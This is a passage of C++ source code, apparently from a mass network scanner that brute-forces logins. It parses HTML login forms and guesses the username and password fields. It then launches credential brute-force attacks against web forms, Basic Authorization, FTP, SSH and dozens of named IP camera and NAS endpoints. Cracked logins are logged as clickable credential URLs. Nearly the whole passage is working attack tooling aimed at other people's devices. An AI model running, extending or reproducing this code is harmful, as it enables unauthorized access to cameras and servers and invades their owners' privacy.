		if(pkeyResult2 != NULL)
		{
			int psz2 = pkeyResult2 - keyResult1;
			strncpy(parVal2, keyResult1, (psz2 < 256 ? psz2 : 256));

			char *keyResult2 = _findFirst(parVal2, "'\"");
			if(keyResult2 != NULL)
			{
				char *keyResult3 = _findFirst(keyResult2 + 1, "'\"> ");
				if(keyResult3 != NULL)
				{
					sz = keyResult3 - keyResult2 - 1;
					char tempRes[256] = {0};
					if(strstr(keyResult2, "./") != NULL) 
					{
						strcpy(result, startPath);
						strncpy(tempRes, keyResult2 + 2, sz - 1);
						if(tempRes[0] != '/') strcat(result, "/");
						strcat(result, tempRes);
					}
					else if(strstr(keyResult2, "/") == NULL)
					{
						if(strcmp(key, "action") == 0)
						{
							strcpy(result, startPath);
							strncpy(tempRes, keyResult2 + 1, sz);
							if(tempRes[0] != '/') strcat(result, "/");
							strcat(result, tempRes);
						}
						else
						{
							strncpy(result, keyResult2 + 1, sz);							
						};
					}
					else
					{
						strncpy(result, keyResult2 + 1, sz);
					};
				};
			}
			else
			{
				keyResult2 = _findFirst(parVal2, "=");
				if(keyResult2 != NULL)
				{
					char *keyResult3 = _findFirst(keyResult2, "'\"> ");
					if(keyResult3 != NULL )
					{
						sz = keyResult3 - keyResult2 - 1;
						strncpy(result, keyResult2 + 1, sz);
						char tempRes[256] = {0};
						if(strstr(keyResult2, "./") != NULL) 
						{
							strcpy(result, startPath);
							strncpy(tempRes, keyResult2 + 2, sz - 1);
							if(tempRes[0] != '/') strcat(result, "/");
							strcat(result, tempRes);
						}
						else if(strstr(keyResult2, "/") == NULL)
						{
							if(strcmp(key, "action") == 0)
							{
								strcpy(result, startPath);
								strncpy(tempRes, keyResult2 + 1, sz);
								if(tempRes[0] != '/') strcat(result, "/");
								strcat(result, tempRes);
							}
							else
							{
								strncpy(result, keyResult2 + 1, sz);
							};
						}
						else
						{
							strncpy(result, keyResult2 + 1, sz);
						};
					}
					else
					{
						strcpy(result, startPath);
						strcat(result, keyResult2 + 1);
					};
				}
			};

		}
		else
		{
			stt->doEmitionFoundData("[WF]: GetParam - Cannot retrieve field.");				
		};
	};
}

static const std::string arrUser[] = {"user", "usr", "username", "login", "lgn", "account", "acc", "param1", "param3", "id", "A1", "uname", "mail", "name"};
std::vector<std::string> vecUser (arrUser, arrUser + sizeof(arrUser) / sizeof(arrUser[0]) );
static const std::string arrPass[] = {"pass", "pw", "password", "code", "param2", "param4", "secret", "login_p", "A2", "admin_pw", "pws", "secretkey"};
std::vector<std::string> vecPass (arrPass, arrPass + sizeof(arrPass) / sizeof(arrPass[0]) );

char *_getAttribute(const char *str, char *attrib)
{
	if(strstri(str, attrib) != NULL)
	{
		char res[1024] = {0};
		char *ptrStart = strstri(str, attrib);
		char *ptrEnd = _findFirst(ptrStart, "\r\n");
		if(ptrEnd != NULL)
		{
			int szAt = strlen(attrib);
			int sz = ptrEnd - ptrStart - szAt;

			if(sz != 0 && sz < 1024) strncpy(res, ptrStart + szAt, sz);
			else return "";

			return res;
		}
		else return "";
	}
	else return "";
}

void _getInputVal(std::vector<std::string> inputVec, char *buff, char *key)
{
	char *pos = NULL;
	char field[256] = {0};
	if(strcmp(key, "USER") == 0)
	{
		for(int i = 0; i < inputVec.size(); ++i)
		{
			ZeroMemory(field, 256);
			_getFormVal((char*)inputVec[i].data(), field, "name=");
			for(int j = 0; j < vecUser.size(); ++j)
			{
				pos = strstri(field, vecUser[j].data());
				if(pos != NULL)
				{
					strncpy(buff, field, 256);
					return;
				};
			};
		};
	}
	else
	{
		for(int i = 0; i < inputVec.size(); ++i)
		{
			ZeroMemory(field, 256);
			_getFormVal((char*)inputVec[i].data(), field, "name=");
			for(int j = 0; j < vecPass.size(); ++j)
			{
				pos = strstri(field, vecPass[j].data());
				if(pos != NULL)
				{
					strncpy(buff, field, 256);
					return;
				};
			};
		};
	};
}

void _specWFBrute(const char *ip, int port, char *hl, const char *buff, int flag, char *path, char *comment, char *tclass, char *cp, int recd, char *title)
{
	if(strstr(buff, "VER_CODE") != NULL || strstri(buff, "captcha") != NULL)
	{
		if(gNegDebugMode)
		{
			stt->doEmitionDebugFoundData("[<a href=\"http://" + QString(ip) + ":" + QString::number(port) + "\"><font color=\"#0084ff\">" + QString(ip) + ":" + QString::number(port) + "</font></a>" + "] Ignoring: Captcha detected.");
		};
		return;
    };

	char methodVal[128] = {0};
	char actionVal[512] = {0};
	char userVal[128] = {0};
	char passVal[128] = {0};
	char frmBlock[4096] = {0};
	char *fBlock = strstri(buff, "<form ");
	char formVal[128] = {0};
	int fbsz = 0;
	char tport[16] = {0};

    sprintf(tport, "%d", port);
	std::vector<std::string> inputVec;
	if(fBlock != NULL)
	{
		char *fBlock2 = strstri(fBlock, ">");
		int szfb2 = fBlock2 - fBlock;
		strncpy(formVal, fBlock, (szfb2 < 128 ? szfb2 : 128));
		char *frmBlockEnd = strstri(fBlock, "</form>");
		if(frmBlockEnd != NULL)
		{
			fbsz = frmBlockEnd - fBlock;
			strncpy(frmBlock, fBlock, (fbsz < 4096 ? fbsz : 4096));
		}
		else
		{
			strncpy(frmBlock, fBlock, 4096);			
		};

		_getFormVal(frmBlock, methodVal, "method");
		_getFormVal(frmBlock, actionVal, "action", path);
		if(actionVal[0] == '.')
		{
			char tmpBuff[512] = {0};
			char *tempPtr1 = _findLast(path, "/");
			int sz = tempPtr1 - path;
			if(sz > 0)
			{
				strncpy(tmpBuff, path, sz);
				strncat(tmpBuff, actionVal + 1, strlen(actionVal) - 1);
				ZeroMemory(actionVal, sizeof(actionVal));
				strcpy(actionVal, tmpBuff);
			};
		};

		char *inptPtr1 = strstri(frmBlock, "<input ");
		int insz = 0;
		char *inptPtrEnd = NULL;
		char tempInptStr[256] = {0};
		while(inptPtr1 != NULL)
		{
			inptPtrEnd = strstr(inptPtr1, ">");
			if(inptPtrEnd != NULL)
			{
				ZeroMemory(tempInptStr, 256);
				insz = inptPtrEnd - inptPtr1 + 1;
				strncpy(tempInptStr, inptPtr1, (insz < 256 ? insz : 256));
				inputVec.push_back(std::string(tempInptStr));
				inptPtr1 = strstri(inptPtrEnd, "<input ");
			}
			else break;
		};

		if(inputVec.size() != 0)
		{
			_getInputVal(inputVec, userVal, "USER");
			_getInputVal(inputVec, passVal, "PASS");
		}
		else
		{
			if(gNegDebugMode) stt->doEmitionFoundData("<a href=\"http://" + QString(ip) + ":" + QString::number(port) + "\"><font color=\"#c3c3c3\">" + QString(ip) + ":" + QString::number(port) + "</font></a> - [WF]: No text/password fields found.");							
			///fillGlobalLogData(ip, hl, tport, std::to_string(recd).c_str(), title, "NULL", "NULL", comment, cp, tclass);
			///putInFile(flag, ip, tport, recd, title, hl, cp);
		};
	}
	else
	{
		stt->doEmitionFoundData("<a href=\"http://" + QString(ip) + ":" + QString::number(port) + "\"><font color=\"#c3c3c3\">" + QString(ip) + ":" + QString::number(port) + "</font></a> - [WF]: Cannot find form block.");
		fillGlobalLogData(ip, hl, tport, std::to_string(recd).c_str(), title, "NULL", "NULL", comment, cp, tclass);
		putInFile(flag, ip, tport, recd, title, hl, cp);
	};
	
	if(strlen(methodVal) == 0)
	{
		strcpy(methodVal, "GET");
	};
	if(strlen(actionVal) == 0)
	{
		strcpy(actionVal, "/");
	}
	else
	{
		if(strstri(actionVal, "http") != NULL)
		{
			char tmp[128] = {0};
			strncpy(tmp, actionVal, 128);
			if(strstr(tmp, "//") != NULL)
			{
				char *tmp1 = strstr(tmp, "//");
				char *tmp2 = strstr(tmp1 + 2, "/");
				ZeroMemory(actionVal, 128);
				if(tmp2 != NULL)
				{
					strncpy(actionVal, tmp2, strlen(tmp2));
				}
				else
				{
					strcpy(actionVal, "/");				
				};
			}
			else if(strstr(tmp, "%2f%2f") != NULL)
			{
				char *tmp1 = strstr(tmp, "%2f%2f");
				char *tmp2 = strstr(tmp1 + 6, "%2f");
				ZeroMemory(actionVal, 128);
				if(tmp2 != NULL)
				{
					strcpy(actionVal, "/");
					strncpy(actionVal, tmp2 + 3, strlen(tmp2) - 3);
				}
				else
				{
					strcpy(actionVal, "/");				
				};
			};			
		};
		if(actionVal[0] != '/')
		{
			char temp[128] = {0};
			strncpy(temp, actionVal, 128);
			strcpy(actionVal, "/");
			strncat(actionVal, temp, strlen(temp));
		};
	};

	if(inputVec.size() > 0)
	{
		if(strlen(userVal) != 0 && strlen(passVal) != 0)
        {
            WFClass WFC;
            lopaStr lps = WFC._WFBrute(ip, port, methodVal, actionVal, userVal, passVal, formVal);

			if(strstr(lps.login, "UNKNOWN") == NULL && strlen(lps.other) == 0) 
			{
                _specFillerWF(ip, tport, title, lps.login, lps.pass, flag);
		
				fillGlobalLogData(ip, hl, tport, std::to_string(recd).c_str(), title, lps.login, lps.pass, comment, cp, tclass);
				putInFile(flag, ip, tport, recd, title, hl, cp);
			};
		}
		else
		{
			if(gNegDebugMode) stt->doEmitionFoundData("<a href=\"http://" + QString(ip) + ":" + QString::number(port) + "\"><font color=\"#c3c3c3\">" + QString(ip) + ":" + QString::number(port) + "</font></a> - [WF]: Cannot find user/pass field.");		
			///fillGlobalLogData(ip, hl, tport, std::to_string(recd).c_str(), title, "", "", "UnknownWebform", cp, tclass);
			///putInFile(flag, ip, tport, recd, title, hl, cp);
		};
    };
}

void _specWEBIPCAMBrute(const char *ip, int port, char *hl, char *finalstr, int flag, char *comment, char *cp, int recd, char *SPEC)
{
	lopaStr lps;
	ZeroMemory(lps.login, sizeof(lps.login));
	ZeroMemory(lps.pass, sizeof(lps.pass));
	ZeroMemory(lps.other, sizeof(lps.other));
    char tport[32] = {0};
    sprintf(tport, ":%d", port);

    lps = _IPCameraBLobby(ip, port, SPEC);

	if(strstr(lps.login, "UNKNOWN") == NULL && strlen(lps.other) == 0) 
	{
        _specFillerBA(ip, tport, finalstr, lps.login, lps.pass, flag);

		fillGlobalLogData(ip, hl, tport, std::to_string(recd).c_str(), finalstr, lps.login, lps.pass, comment, cp, "Basic Authorization");	
	};
}

void _specBrute(const char *ip, int port,
                char *hl, char *finalstr, int flag,
                char *path, char *comment, char *cp, int recd)
{
	char temp[64] = {0};
    char tport[32] = {0};
    sprintf(tport, ":%d", port);

    const lopaStr &lps = BA::BALobby((string(ip) + string(path)).c_str(), port);
	
	if(strstr(lps.login, "UNKNOWN") == NULL && strlen(lps.other) == 0) 
	{
        _specFillerBA(ip, tport, finalstr, lps.login, lps.pass, flag);

		fillGlobalLogData(ip, hl, tport, std::to_string(recd).c_str(), finalstr, lps.login, lps.pass, comment, cp, "Basic Authorization");
	};

	ZeroMemory(temp, sizeof(temp));
}

const char *GetTitle(const char* str)
{
	char delimiterT[] = "<title id=titletext>";
	char delimiterT2[] = "<title id=\"title\">";
	const char *firstStr, *secondStr;
	char finalstr[512] = { 0 };
	
	if (strstri(str, "realm") != NULL)	
	{
		if (strstr(str, "\"") != NULL) 
		{
			int hm;
			firstStr = strstr(str, "\"");
			if(strstr((firstStr+1), "\"") != NULL) 
			{
				secondStr = strstr((firstStr+1), "\"");
				hm = (int)(secondStr-firstStr);
			}
			else hm = 10;
			if(hm > 127) hm = 20;
			strncat(finalstr, firstStr, hm+1);
		};
	};

	if(strlen(finalstr) != 0) strcat(finalstr, "::");

	if(strstri(str, "<card") != NULL)
	{
		char *str1 = strstri(str, "<card");
		if(strstri(str1, "title=") != NULL)
		{
			char *str2 = strstri(str1, "title=");
			if(strstri(str2, ">") != NULL)
			{
				char *str3 = strstri(str2, ">");

				int y = str3 - str2;
				if(y > 256)
				{ 
					strcpy(finalstr, "[Strange title]");
				}
				else
				{
					strncat(finalstr, (char*)(str2 + strlen("title=")), y);
					strcat(finalstr, " += ");
				};
			};
		};
	};

	if(strstri(str, "<title>") != NULL) 
	{  
		if(strstri(str, "<title>") != NULL) firstStr = strstri(str, "<title>");
		if(strstri(firstStr, "</title>") != NULL) secondStr = strstri(firstStr, "</title>");
		else 
		{
			strcat(finalstr, "[Corrupted title]");
			return finalstr;
		};
		int hm = (int)(secondStr - firstStr);
		if(hm > 256) hm = 20;
		strncat(finalstr, firstStr + 7, hm - 7);

		if(strstri(finalstr, "index of /") != NULL)
		{
			int hm = 0;
			strcat(finalstr, " (");
			if(strstri(firstStr, "description") != NULL) firstStr = strstri(firstStr, "description");
			if(strstri(firstStr, "<a href=") != NULL) firstStr = strstri(firstStr, "<a href=");
			else firstStr = NULL;
			int iterCount = 0;
			while(firstStr != NULL && strstr(firstStr , "\">") != NULL && strlen(finalstr) < 480) 
			{
				if(iterCount++ > 4 || strlen(finalstr) > 300) break;
				if(strstr(firstStr, "\">") != NULL) firstStr = strstr(firstStr, "\">");
				else break;
				secondStr = strstri(firstStr, "</a>");
				
				hm = (int)(secondStr-firstStr);
				if(hm > 16) hm = 16;

				strncat(finalstr, firstStr + 2, hm - 2);
				strcat(finalstr, " ");
				if(strstri(firstStr, "<a href=") != NULL) firstStr = strstri(firstStr, "<a href=");
				else break;
			};

			strcat(finalstr, ");");
		};
	};

	if(strstri(str, delimiterT2) != NULL) 
	{ 
		firstStr = strstri(str, delimiterT2);
		if(strstri(firstStr, "</title>") != NULL) secondStr = strstri(firstStr, "</title>");
		else
		{
			strcpy(finalstr, "[Corrupted title]");
			return finalstr;
		};
		int hm = (int)(secondStr-firstStr);
		if(hm > 127) hm = 30;
		strncat(finalstr, firstStr+18, hm-18);
	}
	else if(strstri(str, delimiterT) != NULL) 
	{  
		firstStr = strstri(str, delimiterT);
		if(strstri(firstStr, "</title>") != NULL) secondStr = strstri(firstStr, "</title>");
		int hm = (int)(secondStr-firstStr);
		if(hm > 127) hm = 30;
		strncat(finalstr, firstStr+20, hm-20);
	};

	return finalstr;
}

void _saveSSH(const char *ip, int port, int recd, const char *buffcpy)
{
	if(buffcpy != NULL)
    {
		char log[2048] = {0};
		char logEmit[2048] = {0};
		char goodStr[256] = {0};
		char banner[256] = {0};

		const char *ptr1 = strstr(buffcpy, "|+|");
		if(ptr1 != NULL)
		{
			int gsz = ptr1 - buffcpy;
			strncpy(goodStr, buffcpy, gsz);
			if(strlen(ptr1 + 3) > 0) strcpy(banner, ptr1 + 3);
            char portString[16] = {0};
            sprintf(portString, "%d", port);
            sprintf(log, "[SSH] <font color=\"#00a8ff\"> %s:%d </font><font color=\"#323232\">; Banner:</font> <font color=\"#9cff00\"> %s </font>", goodStr, port, banner);
            sprintf(logEmit, "[SSH] <span style=\"color: #00a8ff;\"> %s:%d </span>", goodStr, port);

			++PieSSH;

            fputsf (log, -22, "SSH");
			char loginSSH[128] = {0};
			char passSSH[128] = {0};
			const char *ptrl1 = strstr(buffcpy, ":");
			int lpsz = ptrl1 - buffcpy;
			strncpy(loginSSH, buffcpy, lpsz);
			const char *ptrl2 = strstr(buffcpy, "@");
			lpsz = ptrl2 - ptrl1;
			strncpy(passSSH, ptrl1 + 1, lpsz);
            fillGlobalLogData(ip, "", portString, std::to_string(recd).c_str(), "[SSH service]", loginSSH, passSSH, "NULL", "UTF-8", "SSH");
			stt->doEmitionFoundData(QString::fromLocal8Bit(logEmit));
		}
		else
		{
			stt->doEmitionRedFoundData("[_saveSSH] Wrong format! [" + QString(ip) + ":" + QString::number(port) + "]");
		};
	}
	else
	{
		stt->doEmitionRedFoundData("[_saveSSH] Empty buffer! [" + QString(ip) + ":" + QString::number(port) + "]");
	};
}

int Lexems::_filler(int p, const char* buffcpy, char* ip, int recd, Lexems *lx, char *hl)
{
    if(	strstr(buffcpy, "SSH-2.0-OpenSSH") != NULL ||
            strstr(buffcpy, "SSH-2.0-mod_sftp") != NULL)
    {
        std::string sshBuff;
        int res = SSHAuth::SSHLobby(ip, p, &sshBuff);
        if(res != -1 && res != -2) _saveSSH(ip, p, recd, (char*)sshBuff.c_str());
		return -1;
	};
	
	if(p == 22)
	{
		_saveSSH(ip, p, recd, buffcpy);
		return -1;
	};

	PathStr ps;
	ps.port = p;
	strcpy(ps.ip, ip);
	ZeroMemory(ps.headr, sizeof(ps.headr));
	ZeroMemory(ps.path, sizeof(ps.path));

	char finalstr[TITLE_MAX_SIZE] = {0};
	char port[32] = {0};
	int flag = 0;
	char cp[32] = {0};

    strcpy(cp, GetCodePage(buffcpy));
	flag = ContentFilter(buffcpy, p, ip, cp);
	if(flag == -1 ) return -1;
	
	strcpy(ps.headr, GetTitle(buffcpy));
	ps.flag = flag;

    char baPath[256] = {0};
    strcpy(baPath, "/");
	
    std::vector<std::string> redirStrLst;
	if(flag == 0 || flag == 3 || flag == 7 )
	{
        int rh = _header(ip, p, buffcpy, lx, &ps, &redirStrLst);
		strcpy(cp, ps.codepage);
		if (rh == -1) {
			return -1;
		}
		if(rh <= -2) 
		{
			flag = ps.flag;
			strcat(finalstr, ps.headr);
			p = ps.port;
			strcpy(ip, ps.ip);
		};
		
		int sz = strlen(ps.path);
        strncpy(baPath, ps.path, (sz < 256 ? sz : 256));
    };

    sprintf(port, "%d", p);

	if(strstr(finalstr, ps.headr) == NULL) strcat(finalstr, ps.headr);
	if (flag == -1 || flag == 6) {
		return -1;
	}

	if(flag == 16) 
    {
		char log[2048] = {0};
		char logEmit[2048] = {0};

        const lopaStr &lps = FTPA::FTPLobby(ip, p, &ps);

		if(strstr(lps.other, "ROUTER") != NULL)
		{
			++PieBA;

            sprintf(log, "[FTP]:<font color=\"#0f62e2\">%s:%s</font>; Received: %d<a href=\"ftp://%s:%s@%s/\"><span style=\"color: #ff6600;\">ftp://%s:%s@%s</span></a> <font color=\"#43EC00\"><a href=\"http://%s\" style=\"color:#43EC00;\">[ROUTER]</a></font>%s",
                    ip, port, recd, lps.login, lps.pass, ip, lps.login, lps.pass, ip, ip, ps.headr);
            sprintf(logEmit, "[FTP]:<a href=\"ftp://%s:%s@%s/\"><span style=\"color: #ff6600;\">ftp://%s:%s@%s</span></a> <font color=\"#43EC00\"><a href=\"http://%s/\" style=\"color:#43EC00;\">[ROUTER]</a></font>",
                    lps.login, lps.pass, ip, lps.login, lps.pass, ip, ip);

            fputsf (log, flag, "FTP");
	
			fillGlobalLogData(ip, hl, port, std::to_string(recd).c_str(), "[FTP service]", lps.login, lps.pass, "Router FTP detected.", cp, "FTP");
						
			stt->doEmitionFoundData(QString::fromLocal8Bit(logEmit));
		}
		else if(strstr(lps.login, "UNKNOWN") == NULL && strlen(lps.other) == 0) 
		{
			++PieBA;

            sprintf(log, "[FTP]:<font color=\"#0f62e2\">%s:%s</font>; Received: %d<a href=\"ftp://%s:%s@%s/\"><span style=\"color: #ff6600;\">ftp://%s:%s@%s</span></a>%s",
                    ip, port, recd, lps.login, lps.pass, ip, lps.login, lps.pass, ip, ps.headr);
            sprintf(logEmit, "[FTP]:<a href=\"ftp://%s:%s@%s/\"><span style=\"color: #ff6600;\">ftp://%s:%s@%s</span></a> (F:%d)",
                    lps.login, lps.pass, ip, lps.login, lps.pass, ip, ps.directoryCount);

            fputsf(log, flag, "FTP");
	
			fillGlobalLogData(ip, hl, port, std::to_string(recd).c_str(), "[FTP service]", lps.login, lps.pass, "NULL", cp, "FTP");

			stt->doEmitionFoundData(QString::fromLocal8Bit(logEmit));

		}
		else if(strstr(lps.login, "Unknown protocol") != NULL) 
		{
			strcat(log, "; [!] USER/PASS commands failed. Dunno what to do.");
            fputsf(log, flag, "");


			stt->doEmitionFoundData(QString::fromLocal8Bit(log));

		};
	}
	else if(flag == 21) //Eyeon
	{
        _specBrute(ip, p, hl, "Eyeon Camera", flag, "/user/index.htm", "Basic Authorization", cp, recd);
	}
	else if(flag == 22) //IP Camera control
	{
        _specBrute(ip, p, hl, "IP camera Control webpage", flag, "/main/cs_motion.asp", "Basic Authorization", cp, recd);
	}
	else if(flag == 23) //Network Camera BB-SC384
	{
        _specBrute(ip, p, hl, "Network Camera BB-SC384", flag, "/live/index2.html", "Basic Authorization", cp, recd);
	}
	else if(flag == 24) //Network Camera VB-M40
	{
        _specBrute(ip, p, hl, "Network Camera VB-M40", flag, "/-wvhttp-01-/open.cgi?", "Basic Authorization", cp, recd);
	}
	else if(flag == 25) //Panasonic WTFISTHISAreaOMGIDONTEVEN-camera
	{
        _specBrute(ip, 60002, hl, "Panasonic WTFISTHISAreaOMGIDONTEVEN-camera", flag, "/SnapshotJPEG", "Basic Authorization", cp, recd);
	}
	else if(flag == 26) //Sony Network Camera
	{
        _specBrute(ip, p, hl, "Sony Network Camera", flag, "/oneshotimage?", "Basic Authorization", cp, recd);
	}
	else if(flag == 27) //UA Network Camera
	{
        _specBrute(ip, p, hl, "UA Network Camera", flag, "/webs.cgi?", "Basic Authorization", cp, recd);
	}
	else if(flag == 28) //Network Camera VB-M40
	{
        _specBrute(ip, p, hl, "Network Camera VB-??", flag, "/-wvhttp-01-/open.cgi?", "Basic Authorization", cp, recd);
	}
	else if(flag == 29) //LG Smart IP Device
	{
        _specBrute(ip, p, hl, "LG Smart IP Device Camera", flag, "/digest.php", "Basic Authorization", cp, recd);
	}
	else if(flag == 30) //NAS
	{
        _specBrute(ip, p, hl, "NAS", flag, "/cgi-bin/data/viostor-220/viostor/viostor.cgi", "Basic Authorization", cp, recd);
	}
	else if(flag == 31) //ip cam
	{
        _specBrute(ip, p, hl, "IP Camera", flag, "/check_user.cgi", "Basic Authorization", cp, recd);
	}
	else if(flag == 32) //IPC WEB ip cam
	{
        _specWEBIPCAMBrute(ip, p, hl, "[IPC] WEB IP Camera", flag, "WEB Authorization", cp, recd, "IPC");
	}
	else if(flag == 33) //GEOvision ip cam
	{
        _specWEBIPCAMBrute(ip, p, hl, "[GEO] WEB IP Camera", flag, "WEB Authorization", cp, recd, "GEO");
	}
	else if(flag == 34) //Hikvision ip cam
	{
        _specBrute(ip, p, hl, "[Hikvision] IP Camera", flag, "/PSIA/Custom/SelfExt/userCheck", "Basic Authorization", cp, recd);
	}
	else if(flag == 35) //EasyCam
	{
        _specWEBIPCAMBrute(ip, p, hl, "[EasyCam] WEB IP Camera", flag, "WEB Authorization", cp, recd, "EasyCam");
	}
	else if(flag == 36) //Panasonic Cam
	{
        _specBrute(ip, p, hl, "[Panasonic] IP Camera", flag, "/config/index.cgi", "Basic Authorization", cp, recd);
	}
	else if(flag == 37) //Panasonic Cam
	{
        _specBrute(ip, p, hl, "[Panasonic] IP Camera", flag, "/view/getuid.cgi", "Basic Authorization", cp, recd);
	}
	else if(flag == 38) //Foscam
	{
        _specWEBIPCAMBrute(ip, p, hl, "[Foscam] IP Camera", flag, "Web Authorization", cp, recd, "Foscam");
	}
	else if(flag == 39) //EagleEye
	{
        _specBrute(ip, p, hl, "[EagleEye] IP Camera", flag, "/cgi-bin/guest/Video.cgi?", "Basic Authorization", cp, recd);
	}
	else if(flag == 40) //Network Camera VB-C??
	{
        _specBrute(ip, p, hl, "[Network Camera VB-C??] IP Camera", flag, "/admin/index.shtml?", "Basic Authorization", cp, recd);
	}
	else if(flag == 41) //AVIOSYS-camera
	{
        _specWEBIPCAMBrute(ip, p, hl, "[AVIOSYS] IP Camera", flag, "Web Authorization", cp, recd, "AVIOSYS");
	}
	else if(flag == 42) //NW_camera
	{
        _specBrute(ip, p, hl, "[NW_camera] IP Camera", flag, "/cgi-bin/getuid?FILE=indexnw.html", "Basic Authorization", cp, recd);
	}
	else if(flag == 43) //NW_camera
	{
        _specBrute(ip, p, hl, "[Micros] IP Camera", flag, "/gui/rem_display.shtml", "Basic Authorization", cp, recd);
	}
	else if(flag == 44) //Hikvision ip cam 2
	{
        _specBrute(ip, p, hl, "[Hikvision] IP Camera 2", flag, "/ISAPI/Security/userCheck", "Basic Authorization", cp, recd);
	}
	else if(flag == 45) //Panasonic ip cam
	{
        _specBrute(ip, p, hl, "[Panasonic] IP Camera", flag, "/config/index.cgi", "Basic Authorization", cp, recd);
	}
	else if(flag == 46) //Buffalo disk
	{
        _specWEBIPCAMBrute(ip, p, hl, "[Buffalo] Lan Disk", flag, "Web Authorization", cp, recd, "BUFFALO");
	}	
	else if(flag == 47) //Digital Video Server
	{
        _specWEBIPCAMBrute(ip, p, hl, "[DVS] Camera", flag, "Web Authorization", cp, recd, "DVS");
	}	
	else if(flag == 48) //ipCAM
	{
        _specWEBIPCAMBrute(ip, p, hl, "[ipCAM] Camera", flag, "Web Authorization", cp, recd, "IPCAM");
	}
	else if (flag == 49) //IEORFOREFOX
	{
		_specWEBIPCAMBrute(ip, p, hl, "[IEORFOREFOX] Camera", flag, "Web Authorization", cp, recd, "IEORFOREFOX");
	}
	else if (flag == 50) //IP Camera
	{
        _specBrute(ip, p, hl, "IP Camera", flag, "/app/multi/single.asp", "Basic Authorization", cp, recd);
	}
	else if(flag == 20) //AXIS Camera
	{
        _specBrute(ip, p, hl, "AXIS Camera", flag, "/axis-cgi/com/ptz.cgi?", "Basic Authorization", cp, recd);
	}
	else if(flag == 19) //reecam cameras
	{
        _specBrute(ip, p, hl, "Reecam (network camera)", flag, "/videostream.cgi", "Basic Authorization", cp, recd);
	}
	else if(flag == 18) //linksys camera
	{
        _specBrute(ip, p, hl, "Linksys camera", flag, "/img/main.cgi", "Basic Authorization", cp, recd);
	}
	else if(flag == 17) //Real-time IP Camera Monitoring System
	{
        _specBrute(ip, p, hl, "Real-time IP Camera Monitoring System", flag, "/live.htm", "Basic Authorization", cp, recd);
	}
	else if(flag == 11) 
	{
        _specBrute(ip, p, hl, "Netwave IP Camera", flag, "/videostream.cgi", "Basic Authorization", cp, recd);
	}
	else if(flag == 12) 
	{
        _specBrute(ip, p, hl, "IP Camera", flag, "/view/view.shtml?videos=", "Basic Authorization", cp, recd);
	}
	else if(flag == 13) 
	{
        _specBrute(ip, p, hl, "IP Camera", flag, "/eng/view/indexjava.html", "Basic Authorization", cp, recd);
	}
	else if(flag == 14) 
	{
        _specBrute(ip, p, hl, "IP Camera", flag, "/rdr.cgi", "Basic Authorization", cp, recd);
	}
	else if(flag == 15) //For HFS
    {
        char log[512] = {0};
		++AnomC1;

        const lopaStr &lps = BA::BALobby((string(ip) + "/~login").c_str(), p);
        sprintf(log, "[HFS]:<font color=\"#ff6600\">%s :: </font><a href=\"http://%s:%s/\"><span style=\"color: #a1a1a1;\">%s:%s</span></a><font color=\"#0084ff\"> T: </font><font color=\"#ff9600\">%s Pass: %s:%s</font>",
                hl, ip, port, ip, port, finalstr, lps.login, lps.pass);

		fillGlobalLogData(ip, hl, port, std::to_string(recd).c_str(), finalstr, lps.login, lps.pass, "HFS-FTP", cp, "Basic Authorization");
        fputsf (log , flag, "HFS");
        stt->doEmitionFoundData(QString::fromLocal8Bit(log));
	}
	else if(flag == 1) 
	{
        _specBrute(ip, p, hl, finalstr, flag, baPath, "[NORMAL]", cp, recd);
	}
	else if(flag == 101) 
	{
        _specBrute(ip, p, hl, finalstr, flag, baPath, "[DIGEST]", cp, recd);
	}
	else if(flag == 10) 
	{
        _specWFBrute(ip, p, hl, buffcpy, flag, baPath, "Web Form", "Web Form", cp, recd, finalstr);
	}
	else 
	{
		putInFile(flag, ip, port, recd, finalstr, hl, cp);
	};

	return flag;
}

int redirectReconnect(char *ip, int port, char *str, Lexems *ls, PathStr *ps, std::vector<std::string> *redirStrLst)
{
	if(ls->iterationCount++ == 5)
	{	
		ls->iterationCount = 0;

		strcpy(ps->headr, "[!][Loop detected.]");
		strcpy(ps->path, "");

		return 0;
	};

	char tempIP[MAX_ADDR_LEN] = {0};
	strcpy(tempIP, ip);
	int tempPort = port;
    char tempPath[1024] = {0};

	if(strstri(str, "https://") != NULL)
	{
		tempPort = 443;
		char *ptr1 = strstri(str, "https://");
        char *ptr2 = _findFirst(ptr1 + 8, ":/?");

		if(ptr2 != NULL)
		{
			int sz = ptr2 - ptr1 - 8;
			ZeroMemory(tempIP, MAX_ADDR_LEN);
			strncpy(tempIP, ptr1 + 8, sz < 128 ? sz : 128);
			if(ptr2[0] == ':')
			{
				char *ptrPath = strstr(ptr2, "/");
				if(ptrPath != NULL)
				{
					sz = ptrPath - ptr2 - 1;

					char *pPth = strstr(ptr1 + 8, "/");
					strcpy(tempPath, pPth);
				}
				else
				{
					strcpy(tempPath, "/");
					sz = ptr2 - ptr1 - 9;
				};
				char tPort[8] = {0};
				strncpy(tPort, ptr2 + 1, sz < 8 ? sz : 5);
				tempPort = atoi(tPort);
			}
			else if(ptr2[0] == '/')
			{
				strncpy(tempPath, ptr2, strlen(ptr2));
			}
			else if(ptr2[0] == '?')
			{
				strcpy(tempPath, "/");
				strncat(tempPath, ptr2, strlen(ptr2));
			}
			else
			{
				stt->doEmitionRedFoundData("[Redirect] Unknown protocol (" + QString(ip) + ":" + QString::number(port) + ")");
			};
		}
		else
		{
			ZeroMemory(tempIP, MAX_ADDR_LEN);
			strncpy(tempIP, ptr1 + 8, strlen(str) - 8);
			strcpy(tempPath, "/");
		};

        std::unique_ptr<char[]> nip(new char[strlen(tempIP) + strlen(tempPath) + 1]);
        sprintf(nip.get(), "%s%s", tempIP, tempPath);
        std::string buffer;
        int cSz = Connector::nConnect(nip.get(), tempPort, &buffer);

        if(cSz > -1)
        {
            strcpy(ps->codepage, GetCodePage(buffer.c_str()));

            ls->flag = ContentFilter(buffer.c_str(), tempPort, tempIP, ps->codepage);
			ps->flag = ls->flag;

			if(ls->flag == -1) 
			{
				ps->flag = -1;
                strcpy(ps->path, tempPath);

				return -1;
			};

			if(ls->flag >= 17 || ls->flag == 11 || ls->flag == 12 
				|| ls->flag == 13 || ls->flag == 14 || ls->flag == 1 || ls->flag == 10) 
			{
                strcat(ps->headr, GetTitle(buffer.c_str()));
				ps->flag = ls->flag;
				strcpy(ps->path, tempPath);
				ps->port = tempPort;
				strcpy(ps->ip, tempIP);

				return -2;
			};

			if(ls->flag == 6)
			{
				ps->flag = ls->flag;
				ps->port = tempPort;
				return -2;			
			};

			strcat(ps->headr, " -> ");
            strcat(ps->headr, GetTitle(buffer.c_str()));

